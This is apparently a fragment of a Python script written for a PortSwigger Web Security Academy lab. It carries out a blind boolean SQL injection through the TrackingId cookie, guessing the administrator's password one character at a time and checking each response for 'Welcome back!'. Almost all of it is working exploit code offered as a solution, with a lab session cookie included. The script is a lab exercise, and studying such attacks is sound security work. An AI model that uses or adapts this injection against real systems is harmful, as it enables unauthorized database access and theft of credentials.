...
url = "https://0aed00f40432 e4f9800550052.web-security-academy.net/"
...
for l in range(1, 20):
    for asc in range(32, 127):
        cookie = {
            "TrackingId": f"4Yje vsRX5Isup' AND (SELECT SUBSTRING(password,{l},1) FROM users WHERE username='administrator') ='{chr(asc)}",
            "session": "76BMsf8 P8rJYDZAjafvfdAcmfz"
        }

        resp = requests.get(url=url, cookies=cookie)
        if "Welcome back!" in resp.text:
            passwd += chr(asc)
            sys.stdout.write("\rTrying: " + passwd )
            sys.stdout.flush()                                           # i use  that to be cool
            break
        else:
            

            sys.stdout.write("\r Trying: " + passwd+ chr(asc))
            sys.stdout.flush()                                          # i use that to be cool
